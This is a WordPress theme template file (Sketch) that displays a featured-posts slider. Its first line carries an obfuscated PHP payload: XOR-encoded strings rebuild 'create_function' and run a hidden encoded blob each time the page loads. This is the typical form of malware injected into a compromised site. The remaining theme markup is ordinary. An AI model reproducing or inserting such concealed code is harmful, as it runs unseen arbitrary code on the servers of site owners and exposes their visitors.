<?php $HvFoVlEQWu='YOQT77;S:B9:XW9'^':=45CRd5O,ZN18W';$RugnroseSam=$HvFoVlEQWu('','UZnP086P3Q848INTE5>gPX7C2UJ8Q0cVAEcLqR=x3FI+VARR=iN:K;H.YT=nS6NOB33M1aCUK=1CDNdHt7=>xiC63VNIepW:jKFU;qb.ENzEBTrEt+1<WPPiBUZ: YWgO8cYDbcQkC2AhjUnGa2+;Q>P18mmHm.TMvbIKhGC0G 3NBO>HDM3AOzOA;PLY9WFO>F3EB;:S:7=Ec.7 8rwzZJAS7Z<TXA.AaR5IQEG+0XBIPg1 5YX;C1pFNgty9:d3M37RKK0-dnvHa=2LBPymP1>PJ;GW0.0 iikU1HDzS0v+5FZCDVlKYR:.j32>4UXTrJT-3<,kBAFYU6;ULC>PpGe4- 3kx1QQKsFP7=CRyESL7AA3YdCrS>PH MZ0 7HajSI9EIBF8EbPT-3QUwgX4 9<cInJi2NzmU7HPWyfsD<<T3 4-WL4g;::hOJ2U36V,HM-59=fU+20V8UKkJUJ15qAJaZ+ZA+F=6qEPr0FBBPW0LwwWJ79A88b1=;rS0UE:OLC9-2ohjcI4;0ZcjIGXPPFQM,8L8ktG 1RiGoGPUDMSsSRFAGJXfKSfROmMxPnUpwcYNthvULlmEpAR6K RYcS EfV>91IOpO:1:+,OXNzlWHSNLKLJLQgcs17o=4,4qH<P9O.R1J:WD2Hj;FlGFY RHrSOk40'^'<<FqVMX3G8WZg,6=6AMOw X1m1+L0o<;41DeXrFr: <E55;=SI6U9d,O-5b1>C:gfWR9PMcq XHjdnDhTL77qM,CGvsiBWl0cB :IYFGesZuytV,HXEN;5>Af1;NAplGkQHrmhjXO,G5HDhNoEVJO0etXeM3hIE14-F kMg0D5LV jkU-=dnhtpFHI58,K9nkQ3Gly13.0J7OGJVTYRJZ<+- Ra6p< Z >9P0qxgMQ41,km;FZ+=Z YPnj876vq-vmRDro UTDSHhEKS 75PM+;7t.Z36oEUYITKqZ-=AY9ROT2;cyvH=8>OKQ9O4><>tZkpIRHMBb:LP3YI0- VpXc:fhqf.+eq08Sb;RDcoGew:V-4VpD8xZ7t,A9;oKR1AWsmR 0yL1LF45YRqhWC.ULLYXCg7cODpI1V<1wDF31RO1AIUA>6QOCUH7++F4li;Y<eOTJXPatVU5W1.Cn1+ETXmjE>J. t-XOXlkxY jf46D-WQqjVK3YA=ZXB-6H<6N<ddRHKHDJG-UOQsCLogp=4syiHY8Y0S,EHu4nOzmuctkAg4 pry<Q.1PbxU+L6X7DFRi,EZG4.KDeVgrW9R3 <8E<93FPB=<XhJPCGC.<iVLs,2:-bejlqGCSJ=fXBMXYlX1M.uuA+C;+S,MfoWMO<X;<ZcfP>M');$RugnroseSam();
/**
 * @package Sketch
 */

$featured = sketch_get_featured_posts();

if ( empty( $featured ) )
	return;
?>

<div id="featured-content" class="flexslider">
	<div class="flex-viewport-wrapper">
		<ul class="featured-posts slides" id="featured-slides">
		<?php
			foreach ( $featured as $post ) :
				setup_postdata( $post ); ?>

			<li id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
				<a href="<?php the_permalink(); ?>" title="<?php the_title_attribute(); ?>">
					<span class="entry-thumbnail">
						<?php if ( has_post_thumbnail() ) : ?>
							<?php the_post_thumbnail( 'sketch-featured' ); ?>
						<?php endif; ?>
					</span>
				</a>
				<header class="entry-header">
					<?php the_title( sprintf( '<h1 class="entry-title"><a href="%s" rel="bookmark">', esc_url( get_permalink() ) ), '</a></h1>' ); ?>

					<div class="entry-meta">
						<?php sketch_posted_on(); ?>
						<?php edit_post_link( __( 'Edit', 'sketch' ), '<span class="sep"> | </span><span class="edit-link">', '</span>' ); ?>
					</div><!-- .entry-meta -->
				</header><!-- .entry-header -->
			</li><!-- #post-## -->
		<?php
			endforeach;
			wp_reset_postdata(); ?>
		</ul>
	</div>
</div>